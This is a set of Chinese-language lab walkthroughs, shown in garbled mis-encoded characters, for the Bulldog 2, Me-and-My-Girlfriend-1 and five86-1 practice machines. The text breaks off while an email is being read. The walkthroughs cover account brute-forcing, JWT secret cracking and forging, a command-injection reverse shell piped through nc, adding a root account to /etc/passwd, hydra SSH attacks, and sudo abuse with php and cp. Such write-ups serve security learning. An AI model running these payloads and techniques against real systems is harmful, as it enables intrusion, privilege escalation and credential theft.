dirbæ‰«æè·¯å¾„æ—¶æ²¡æœ‰å‘ç°æœ‰ä»·å€¼çš„ä¿¡æ¯ æ‰‹å·¥ç™»å½•ç½‘é¡µæ—¶å‘ç°è·¯å¾„/loginï¼Œ/registerï¼Œ/about è·¯å¾„/ä¸‹æœ‰ä¸€äº›ç”¨æˆ·è¯„è®º è·¯å¾„/loginä¸‹å­˜åœ¨ç™»å½•ç‚¹ è·¯å¾„/registeræç¤ºæ— æ³•æ³¨å†Œ æ¼æ´åˆ©ç”¨ è´¦æˆ·çˆ†ç ´ æ„é€ å­—å…¸ 12345678910111213141516171819202122232425262728293031323334cat dicBulldogbulldogSocialsocialJohnathan AbbeyJohnathanjohnathanAbbeyabbeySarah DubreeSarahsarahDubreedubreeWilliam KatzWilliamwilliamKatzkatzWinston ChurchyWinstonwinstonChurchychurchyBulldog IndustriesIndustriesindustriesnetworkadminroot123456a123456 ä½¿ç”¨burpsuiteè¿›è¡Œçˆ†ç ´ï¼Œå¤±è´¥ è´¦æˆ·æ³¨å†Œ å®¡è®¡jsæ–‡ä»¶ï¼Œæœç´¢&quot;register&quot; å‘ç°ä¸¤å¤„ä¸ä¸Šä¼ æœ‰å…³çš„å‡½æ•° 1234567891011121314151617181920return l.prototype.registerUser &#x3D; function(l) &#123; var n &#x3D; new x.Headers; return n.append(&quot;Content-Type&quot;, &quot;application&#x2F;json&quot;), this.http.post(&quot;&#x2F;users&#x2F;register&quot;, l, &#123; headers: n &#125;).map(function(l) &#123; return l.json() &#125;) &#125;,-----------------l.prototype.onRegisterSubmit &#x3D; function() &#123;var l &#x3D; this,n &#x3D; &#123; name: this.name, email: this.email, username: this.username, password: this.password&#125;; çŒœæµ‹å¯ä»¥ä»¥POSTæ–¹å¼è¯·æ±‚è·¯å¾„/users/registerï¼Œå¹¶é™„å¸¦ç›¸åº”æ ¼å¼çš„jsonæ•°æ®å³å¯å®Œæˆæ³¨å†Œ åœ¨burpä¸­æ„é€ è¯·æ±‚ 12345678910111213141516POST &#x2F;users&#x2F;register HTTP&#x2F;1.1Host: 192.168.31.233User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*Accept-Language: en-US,en;q&#x3D;0.5Accept-Encoding: gzip, deflatecontent-type: application&#x2F;jsonContent-Length: 84Connection: close&#123;&quot;name&quot;: &quot;abc&quot;,&quot;email&quot;: &quot;abc@abc.abc&quot;,&quot;username&quot;: &quot;abc&quot;,&quot;password&quot;: &quot;abc&quot;&#125; å¾—åˆ°å“åº” 1234567891011HTTP&#x2F;1.1 200 OKServer: nginx&#x2F;1.14.0 (Ubuntu)Date: Thu, 20 Feb 2020 09:32:26 GMTContent-Type: application&#x2F;json; charset&#x3D;utf-8Content-Length: 40Connection: closeX-Powered-By: ExpressAccess-Control-Allow-Origin: *ETag: W&#x2F;&quot;28-r22PRevV1bosgiTQ0L7&#x2F;zW61meQ&quot;&#123;&quot;success&quot;:true,&quot;msg&quot;:&quot;User registered&quot;&#125; ä½¿ç”¨è´¦æˆ·abc:abcæˆåŠŸç™»å…¥ ç™»å…¥ä¹‹åå‘ç°è‡ªå·±ä¸èƒ½æ‰§è¡Œä»»ä½•åŠŸèƒ½ï¼Œå¼€å§‹å‚ç›´ææƒ å‚ç›´ææƒ åœ¨ç™»å…¥æ—¶å‘ç°ä¸€æ¬¡httpäº¤äº’ä¸­å¸¦æœ‰ä¸€æ®µjson 1234567891011&#123; &quot;success&quot;:true, &quot;token&quot;:&quot;JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJhYmMiLCJlbWFpbCI6ImFiY0BhYmMuYWJjIiwidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoic3RhbmRhcmRfdXNlciJ9LCJpYXQiOjE1ODIxOTE2NTYsImV4cCI6MTU4Mjc5NjQ1Nn0.zM0g_sVeMr4b5j5TYVDBmpVbliuQct6kGiuDRhDLRPg&quot;, &quot;user&quot;: &#123; &quot;name&quot;:&quot;abc&quot;, &quot;username&quot;:&quot;abc&quot;, &quot;email&quot;:&quot;abc@abc.abc&quot;, &quot;auth_level&quot;:&quot;standard_user&quot; &#125;&#125; è§£æJWTå¾—åˆ°å¦‚ä¸‹å†…å®¹ 12&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;standard_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125; å†å®¡è®¡jsï¼ŒæŸ¥æ‰¾&quot;auth_level&quot; 12345l.prototype.isAdmin&#x3D;function()&#123; var l&#x3D;localStorage.getItem(&quot;user&quot;); return null!&#x3D;&#x3D;l &amp;&amp; &quot;master_admin_user&quot;&#x3D;&#x3D;JSON.parse(l).auth_level&#125; å‘ç°&quot;master_admin_user&quot; å¯ä»¥å°è¯•ä¿®æ”¹JWTæ¥å°è¯•ææƒ å°è¯•çˆ†ç ´JWTç§˜é’¥ 1234git clone https:&#x2F;&#x2F;github.com&#x2F;brendan-rius&#x2F;c-jwt-crackercd c-jwt-crackerchmod +x jwtcrack.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJhYmMiLCJlbWFpbCI6ImFiY0BhYmMuYWJjIiwidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoic3RhbmRhcmRfdXNlciJ9LCJpYXQiOjE1ODIxOTE2NTYsImV4cCI6MTU4Mjc5NjQ1Nn0.zM0g_sVeMr4b5j5TYVDBmpVbliuQct6kGiuDRhDLRPg abcdefghijklmnopqrstuvwxyz 6 å¾—åˆ°ç§˜é’¥ä¸º&quot;secret&quot; ä¿®æ”¹JWTæ•°æ®å†…å®¹ 12&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;master_admin_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125; ä¼ªé€ JWT 12345pip install pyjwtpythonimport jwtjwt.encode(&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;master_admin_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125;, &#39;secret&#39;, algorithm&#x3D;&#39;HS256&#39;) &#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1ODIxOTE2NTYsInBheWxvYWQiOnsidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoibWFzdGVyX2FkbWluX3VzZXIiLCJuYW1lIjoiYWJjIiwiZW1haWwiOiJhYmNAYWJjLmFiYyJ9LCJleHAiOjE1ODI3OTY0NTZ9.snQ_kH-0xRB9BWxbIMyxD1sOhFzp9-TKp5QYIPZ-kpk&#39; åœ¨burpä¸­å¼€å¯æ‹¦æˆªHTTPå“åº”ï¼Œç™»å‡ºè´¦æˆ·å¹¶ç™»å…¥ï¼Œç”¨å¦‚ä¸‹çš„æ•°æ®ä»£æ›¿èº«ä»½æ ¡éªŒæ­¥éª¤çš„JWTæ•°æ® 1234567891011&#123; &quot;success&quot;:true, &quot;token&quot;:&quot;JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1ODIxOTE2NTYsInBheWxvYWQiOnsidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoibWFzdGVyX2FkbWluX3VzZXIiLCJuYW1lIjoiYWJjIiwiZW1haWwiOiJhYmNAYWJjLmFiYyJ9LCJleHAiOjE1ODI3OTY0NTZ9.snQ_kH-0xRB9BWxbIMyxD1sOhFzp9-TKp5QYIPZ-kpk&quot;, &quot;user&quot;: &#123; &quot;name&quot;:&quot;abc&quot;, &quot;username&quot;:&quot;abc&quot;, &quot;email&quot;:&quot;abc@abc.abc&quot;, &quot;auth_level&quot;:&quot;master_admin_user&quot; &#125;&#125; è·å¾—adminæƒé™ åœ¨dashboardå‘ç°ä¸€ä¸ªLink+ç™»å…¥ç‚¹ å°è¯•çˆ†ç ´ï¼Œå¤±è´¥ æŠ¥é”™ä¿¡æ¯ è®¿é—®è·¯å¾„/%aa è·å¾—æŠ¥é”™ä¿¡æ¯ 1234567891011121314151617URIError: Failed to decode param &#39;&#x2F;%aa&#39; at decodeURIComponent (&lt;anonymous&gt;) at decode_param (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:172:12) at Layer.match (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:123:27) at matchLayer (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:574:18) at next (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:220:15) at SessionStrategy.strategy.pass (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:338:9) at SessionStrategy.authenticate (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;strategies&#x2F;session.js:75:10) at attempt (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:361:16) at authenticate (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:362:7) at Layer.handle [as handle_request] (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5) at trim_prefix (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:317:13) at &#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:284:7 at Function.process_params (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12) at next (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:275:10) at initialize (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;initialize.js:53:5) at Layer.handle [as handle_request] (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5) åœ¨githubä¸Šæ‰¾åˆ°&quot;Bulldog-2-The-Reckoning&quot;çš„æºç  https://github.com/Frichetten/Bulldog-2-The-Reckoning åœ¨/router/users.jsä¸­å‘ç°å­˜åœ¨execå‡½æ•° 12345678exec(&#96;linkplus -u $&#123;username&#125; -p $&#123;password&#125;&#96;, (error, stdout, stderr) &#x3D;&gt; &#123;if (error) &#123; console.error(&#96;exec error: $&#123;error&#125;&#96;); return;&#125;console.log(&#96;stdout: $&#123;stdout&#125;&#96;);console.log(&#96;stderr: $&#123;stderr&#125;&#96;);&#125;); å¯ä»¥åœ¨adminä¸­çš„ç™»å…¥ç‚¹å®ç°å‘½ä»¤æ³¨å…¥ ç›‘å¬ç«¯å£ nc -lvvp 2020 åå¼¹Shell 1234&#123; &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;bash -i 2&gt;&amp;1|nc 192.168.31.10 2020 &gt;&#x2F;tmp&#x2F;f&quot;&#125; æˆåŠŸæ¥æ”¶Shell æƒé™æå‡ æŸ¥çœ‹æ–‡ä»¶/etc/passwdçš„æƒé™ 123ls -l &#x2F;etc&#x2F;passwd -rwxrwxrwx 1 root root 1790 Feb 20 12:09 &#x2F;etc&#x2F;passwd /etc/passwdå¯å†™ æ„é€ è´¦æˆ·ä¿¡æ¯å¹¶å†™å…¥/etc/passwd 1234567openssl passwd -6 hackforfun $6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1echo &#39;test::$6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1:0:0:toor:&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwdsu toorhackforfunid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) JWT JWTææƒæ—¶æœ‰äº›è¿· ç›´æ¥ä¿®æ”¹æ•°æ®è€Œä¸ä¿®æ”¹ç­¾å ææƒæˆåŠŸ æ•°æ®ä¸ç­¾åéƒ½ä¿®æ”¹ ææƒæˆåŠŸ ç›´æ¥åˆ æ‰ç­¾åéƒ¨åˆ† ææƒå¤±è´¥ jwtcrackç ´è§£6ä½çº¯å°å†™å¯†ç åœ¨è™šæ‹Ÿæœºä¸­å¤§æ¦‚éœ€è¦3minã€‚ å‚è€ƒèµ„æ–™ JWT /etc/passwd WP WP Me-and-My-Girlfriend-1 2020/03/04 13:23:34 ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.164 12345678910111213141516171819202122232425Nmap scan report for 192.168.31.164Host is up (0.0015s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)| 2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)| 256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)|_ 256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.7 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text&#x2F;html).MAC Address: 08:00:27:06:D9:59 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Uptime guess: 0.002 days (since Wed Mar 4 00:21:12 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;256 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Webè·¯å¾„æšä¸¾ dirb http://192.168.31.233/ -w 123456---- Scanning URL: http:&#x2F;&#x2F;192.168.31.164&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.164&#x2F;config&#x2F; + http:&#x2F;&#x2F;192.168.31.164&#x2F;index.php (CODE:200|SIZE:120) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.164&#x2F;misc&#x2F; + http:&#x2F;&#x2F;192.168.31.164&#x2F;robots.txt (CODE:200|SIZE:32) + http:&#x2F;&#x2F;192.168.31.164&#x2F;server-status (CODE:403|SIZE:294) è®¿é—®/ï¼š Who are you? Hacker? Sorry This Site Can Only Be Accessed local! è®¿é—®robots.txtï¼š 12User-Agent: *Allow: &#x2F;heyhoo.txt è®¿é—®/heyhoo.txtï¼šGreat! What you need now is reconn, attack and got the shell æ¼æ´åˆ©ç”¨ ä½¿ç”¨hackbarè¿›è¡Œæ“ä½œ æ·»åŠ HTTP Header: X-Forwarded-For: 0.0.0.0 è¯·æ±‚/ä¹‹åå‘ç°é¡µé¢æ— å˜åŒ–ï¼Œè€Œæµè§ˆå™¨è·¯å¾„å˜æˆ/?page=index å†æ¬¡è¯·æ±‚/?page=indexï¼Œåˆ™æ˜¾ç¤ºæ­£å¸¸é¡µé¢ ä¸ªäººæ¨æµ‹æ˜¯ä»¿é€ IPè¯·æ±‚/ä¹‹åï¼Œè§¦å‘302è·³è½¬è‡³?page=indexï¼Œè€Œè·³è½¬ä¹‹åçš„è¯·æ±‚è¿›è¡Œä¼ªé€ IPï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œä¸¤æ­¥æ“ä½œã€‚åŒ…æ‹¬ä¹‹åçš„è¯·æ±‚éƒ½è¦å…ˆç‚¹å‡»é“¾æ¥ï¼Œå¯¼å…¥hackbarï¼Œåœ¨hackbarä¸­è¯·æ±‚ã€‚ åœ¨registeré¡µé¢ä¸­æ³¨å†Œä¸€ä¸ªç”¨æˆ· éšålogin è¿™ä¸¤æ­¥æ¨èåœ¨BurpSuiteä¸­æ“ä½œ HTTP HeaderåŠ ä¸ŠX-Forwarded-For: 0.0.0.0å³å¯ æˆåŠŸç™»å…¥ä¹‹åè·¯å¾„ä¸º/index.php?page=dashboard&amp;user_id=12 è€Œè¿›å…¥profileä¹‹åå¯ä»¥åœ¨æºç ä¸­æŸ¥çœ‹å½“å‰ç”¨æˆ·åä¸å¯†ç  æ›´æ”¹user_idå‚æ•°ï¼Œå³å¯æœªæˆæƒè®¿é—®å…¶ä»–ç”¨æˆ·çš„profileé¡µé¢ å°†æ‰€è·å–çš„è´¦æˆ·ä¸å¯†ç å†™å…¥æ–‡ä»¶ï¼Œå†æ·»åŠ ä¸¤ä¸ªå¸¸ç”¨è¯ 12345678910111213141516cat diceweuhtandinganskuyatuhaingmaungqwerty!!!sundateaindONEsiasedihaingmahcedihhihihialice4lic3abdikasepakdorrrrradminroot åˆ©ç”¨hydraå¯¹SSHæœåŠ¡è¿›è¡Œçˆ†ç ´ 12hydra -I -L dic -P dic -v -e ns ssh:&#x2F;&#x2F;192.168.31.164 [22][ssh] host: 192.168.31.164 login: alice password: 4lic3 æˆåŠŸè·å–è´¦æˆ· æƒé™æå‡ 12ssh alice@192.168.31.164 4lic3 æŸ¥çœ‹sudoæƒé™ 1234567sudo -lMatching Defaults entries for alice on gfriEND: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser alice may run the following commands on gfriEND: (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;php ç”¨sudoæƒé™ä½¿ç”¨phpæ¥è¿›è¡Œææƒ 123sudo php -r &quot;system(&#39;&#x2F;bin&#x2F;bash&#39;);&quot;id uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) å¯†ç å…±ç”¨ å€¼å¾—ä¸€æçš„æ˜¯ï¼Œé™¤äº†WEBæœåŠ¡ä¸­aliceè´¦æˆ·å¯ä»¥ç”¨äºç™»å…¥SSHæœåŠ¡ä¹‹å¤–ï¼Œæ•°æ®åº“çš„å¯†ç (/var/www/html/config/config.php)ä¹Ÿæ˜¯rootç”¨æˆ·çš„å£ä»¤ã€‚è¿›è¡Œé¶æœºæ¸—é€æ—¶ç»å¸¸ä¼šå‡ºç°è¿™ç§çŠ¶å†µï¼Œå½“è·å–åˆ°ä¸€äº›è´¦æˆ·æ—¶ï¼Œä¸å¦¨è¯•ç€åœ¨åå°è¿è¡Œä¸€ä¸‹hydraã€‚ç°å®ä¸­è¿™ç§æƒ…å†µä¹Ÿå¾ˆå¸¸è§ï¼Œè™½ç„¶ç†æƒ³çŠ¶æ€ä¸‹æ¯ä¸ªå¯†ç éƒ½è¶³å¤Ÿå¤æ‚è€Œä¸”å„ä¸ç›¸åŒï¼Œä½†ç»ˆå°†åªæ˜¯ç†æƒ³çŠ¶æ€ç½¢äº†ã€‚ Mysql æ¸—é€è¿‡ç¨‹ä¸­ä¹Ÿå°è¯•è¿‡é’ˆå¯¹user_idå‚æ•°è¿›è¡ŒSQLæ³¨å…¥ï¼Œä½†æ˜¯ä¹Ÿæ²¡æœ‰è¿›å±•ï¼Œå›è¿‡å¤´æƒ³ä¸€ä¸‹nmapæ‰«æç«¯å£æ—¶å¹¶æœªå‘ç°MysqlæœåŠ¡ã€‚åæ¥åœ¨ç½‘ä¸Šçœ‹äº†ä¸€ä¸‹ï¼Œmysqlå¯ä»¥è®¾ç½®ä¸ºä»…æœ¬åœ°è®¿é—®(localhost/127.0.0.1/0.0.0.0)ã€‚ sudo ä¹‹å‰å¯¹äºsudoçš„ç†è§£è¿˜æ˜¯ä¸å¤Ÿé€å½»ï¼Œä»…ä»…å•çº¯åœ°ä»¥ä¸ºsudoæƒé™å°±æ˜¯sudo -iç›´æ¥ærootï¼Œæˆ–è€…sudoæ¥å‘½ä»¤ï¼Œç‰‡é¢åœ°è®¤ä¸ºsudoæƒé™æ˜¯åœ¨è´¦å·å±‚é¢ä¸Šçš„ã€‚å®åˆ™å¯ä»¥æ›´ä¸ºç»†åŒ–ï¼Œå¦‚è®©è´¦æˆ·å¯ä»¥ä»¥sudoæƒé™æ‰§è¡ŒæŸäº›å‘½ä»¤ã€‚ å‚è€ƒèµ„æ–™ sudo wp mysql five86-1 2020/03/08 18:20:27 ç«¯å£æ‰«æ nmap -p 1-65535 -Pn -T5 -sV -A -n -v 192.168.31.209 12345678910111213141516171819202122232425262728293031Nmap scan report for 192.168.31.209Host is up (0.00033s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey: | 2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)| 256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)|_ 256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.38 ((Debian))| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD| http-robots.txt: 1 disallowed entry |_&#x2F;ona|_http-server-header: Apache&#x2F;2.4.38 (Debian)|_http-title: Site doesn&#39;t have a title (text&#x2F;html).10000&#x2F;tcp open http MiniServ 1.920 (Webmin httpd)|_http-favicon: Unknown favicon MD5: 6E79CCAA5DCB1FD29C6A7C795BBD608E| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Site doesn&#39;t have a title (text&#x2F;html; Charset&#x3D;iso-8859-1).MAC Address: 08:00:27:D8:1F:90 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Uptime guess: 7.882 days (since Sat Feb 29 08:12:28 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Webè·¯å¾„æšä¸¾ dirb http://192.168.31.209/ -w 12345---- Scanning URL: http:&#x2F;&#x2F;192.168.31.209&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.209&#x2F;index.html (CODE:200|SIZE:30) + http:&#x2F;&#x2F;192.168.31.209&#x2F;reports (CODE:401|SIZE:461) + http:&#x2F;&#x2F;192.168.31.209&#x2F;robots.txt (CODE:200|SIZE:29) + http:&#x2F;&#x2F;192.168.31.209&#x2F;server-status (CODE:403|SIZE:279) /reportsè·¯å¾„éœ€è¦è¿›è¡Œbasicè®¤è¯ è®¿é—®/robots.txtï¼Œå¾—åˆ°å¦‚ä¸‹å†…å®¹ 12User-agent: *Disallow: &#x2F;ona è·¯å¾„/onaä¸‹è¿è¡Œçš„æ˜¯&quot;opennetadmin v18.1.1&quot; 10000ç«¯å£ä¸Šçš„webminæœåŠ¡éœ€è¦è´¦æˆ· æ¼æ´åˆ©ç”¨ opennetadminå­˜åœ¨RCEæ¼æ´ 1234searchsploit opennetadminOpenNetAdmin 13.03.01 - Remote Code Execution | exploits&#x2F;php&#x2F;webapps&#x2F;26682.txtOpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | exploits&#x2F;php&#x2F;webapps&#x2F;47772.rbOpenNetAdmin 18.1.1 - Remote Code Execution | exploits&#x2F;php&#x2F;webapps&#x2F;47691.sh webminå­˜åœ¨RCEæ¼æ´ä½†æ˜¯éœ€è¦æä¾›è´¦æˆ· åœ¨MSFä¸­ä½¿ç”¨onaçš„RCEæ¼æ´åˆ©ç”¨æ¨¡å— 1234use exploit&#x2F;linux&#x2F;http&#x2F;opennetadmin_ping_cmd_injectionset RHOST 192.168.31.209set LHOST 192.168.31.10run è·å–shell å½“æ—¶MSFåœ¨kaliæºä¸Šçš„æœ€æ–°ç‰ˆæœ¬ä¸º5.0.76ï¼Œè€Œgithubä¸Šå·²æ›´æ–°åˆ°5.0.79ï¼Œè€Œä¸”è¯¥RCEæ¼æ´æ¨¡å—æ˜¯åœ¨5.0.77ç‰ˆæœ¬åŠ å…¥MSFï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨å°†æ¼æ´æ¨¡å—å¯¼å…¥MSFï¼Œè¯¦æƒ…è§ä¸‹æ–‡ æƒé™æå‡ æŸ¥çœ‹æ–‡ä»¶/var/www/html/reports/.htaccess 123456cat &#x2F;var&#x2F;www&#x2F;html&#x2F;reports&#x2F;.htaccessAuthType BasicAuthName &quot;Restricted Area&quot;AuthUserFile &#x2F;var&#x2F;www&#x2F;.htpasswdrequire valid-user æŸ¥çœ‹æ–‡ä»¶/var/www/.htpasswd 123456cat &#x2F;var&#x2F;www&#x2F;.htpasswd douglas:$apr1$9fgG&#x2F;hiM$BtsL9qpNHUlylaLxk81qY1# To make things slightly less painful (a standard dictionary will likely fail),# use the following character set for this 10 character password: aefhrt å¾—åˆ°è´¦æˆ·douglasçš„å¯†ç hashä¸å¯†ç çš„ç›¸å…³ä¿¡æ¯ ç”±å­—ç¬¦aefhrtç»„æˆ é•¿åº¦ä¸ºåä½ å°†hashä¿å­˜åˆ°æœ¬åœ° echo 'douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1' &gt; passwd ä½¿ç”¨crunchæ„é€ å­—å…¸ crunch 10 10 aefhrt -o pass ä½¿ç”¨johnçˆ†ç ´hash 123john --wordlist&#x3D;pass --format&#x3D;md5crypt passwdjohn --show passwd douglas:fatherrrrr ä½¿ç”¨douglasè´¦æˆ·ç™»å…¥ç›®æ ‡ä¸»æœº 12ssh douglas:192.168.31.206fatherrrrr æŸ¥çœ‹sudoæƒé™ 1234567sudo -lMatching Defaults entries for douglas on five86-1: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;binUser douglas may run the following commands on five86-1: (jen) NOPASSWD: &#x2F;bin&#x2F;cp å¯ä»¥ä»¥ç”¨æˆ·jenèº«ä»½æ‰§è¡Œcpå‘½ä»¤ ç”Ÿæˆsshç§˜é’¥ï¼Œæ‹·è´è‡³jenè´¦æˆ·çš„homeç›®å½•ä¸­ï¼Œåˆ‡æ¢è‡³è´¦æˆ·jen 1234ssh-keygen -t rsa -C &quot;jen@127.0.0.1&quot;cp &#x2F;home&#x2F;douglas&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;tmp&#x2F;authorized_keyssudo -u jen cp &#x2F;tmp&#x2F;authorized_keys &#x2F;home&#x2F;jen&#x2F;.ssh&#x2F;authorized_keysssh jen@127.0.0.1 ç™»å…¥ä¿¡æ¯ä¸­å¾—åˆ°æç¤º 1You have new mail. æŸ¥çœ‹é‚®ä»¶ 1234567891011121314151617181920212223242526272829cat &#x2F;var&#x2F;mail&#x2F;jenFrom roy@five86-1 Wed Jan 01 03:17:00 2020Return-path: &lt;roy@five86-1&gt;Envelope-to: 